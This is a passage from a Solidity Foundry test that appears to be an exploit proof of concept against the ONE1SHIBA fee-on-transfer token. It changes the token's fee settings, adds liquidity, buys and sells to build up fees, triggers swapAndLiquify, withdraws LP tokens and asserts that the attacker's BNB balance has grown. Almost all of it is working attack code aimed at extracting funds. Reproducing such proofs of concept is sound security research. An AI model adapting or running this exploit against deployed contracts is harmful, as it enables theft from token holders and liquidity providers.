        ONE1SHIBA(TARGET).approve(ROUTER_ADDRESS, liquidityTokens);
        router.addLiquidityETH{value: liquidityBNB}(
            TARGET,
            liquidityTokens,
            0,
            0,
            attacker,
            block.timestamp
        );

        // Step 6: Set fees back to normal to accumulate in contract
        ONE1SHIBA(TARGET).setTaxFeePercent(1);
        ONE1SHIBA(TARGET).setLiquidityFeePercent(8);

        // Step 7: Generate trading volume
        // Buy more tokens to generate fees
        address WETH = router.WETH();
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = TARGET;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Sell some to generate more fees
        uint256 tokensToSell = ONE1SHIBA(TARGET).balanceOf(attacker) / 4;
        ONE1SHIBA(TARGET).approve(ROUTER_ADDRESS, tokensToSell);

        path[0] = TARGET;
        path[1] = WETH;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensToSell,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 8: Check contract token balance and trigger swapAndLiquify if possible
        uint256 contractBalance = ONE1SHIBA(TARGET).balanceOf(TARGET);
        if (contractBalance > 0) {
            // Enable swap and liquify
            ONE1SHIBA(TARGET).setSwapAndLiquifyEnabled(true);

            // Trigger by transferring from a non-pair address
            address dummy = address(0x123);
            // Give dummy some tokens first
            deal(TARGET, dummy, 1);
            vm.prank(dummy);
            ONE1SHIBA(TARGET).transfer(ONE1SHIBA(TARGET).uniswapV2Pair(), 1);
        }

        // Step 9: Remove any LP tokens we have
        address pair = ONE1SHIBA(TARGET).uniswapV2Pair();
        uint256 lpBalance = IUniswapV2Pair(pair).balanceOf(attacker);
        if (lpBalance > 0) {
            IUniswapV2Pair(pair).approve(ROUTER_ADDRESS, lpBalance);
            router.removeLiquidityETHSupportingFeeOnTransferTokens(
                TARGET,
                lpBalance,
                0,
                0,
                attacker,
                block.timestamp
            );
        }

        // Verify profit
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should increase");
    }

    // Helper to get current supply (copied from contract)
    function _getCurrentSupply(address token) private view returns (uint256, uint256) {
        // We need to read storage directly
        // _rTotal is at slot 8, _tTotal at slot 7
        bytes32 rTotalSlot = bytes32(uint256(8));
        bytes32 tTotalSlot = bytes32(uint256(7));

        uint256 rTotal = uint256(vm.load(token, rTotalSlot));
        uint256 tTotal = uint256(vm.load(token, tTotalSlot));

        // We also need to account for excluded addresses, but for simplicity ignore
        return (rTotal, tTotal);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
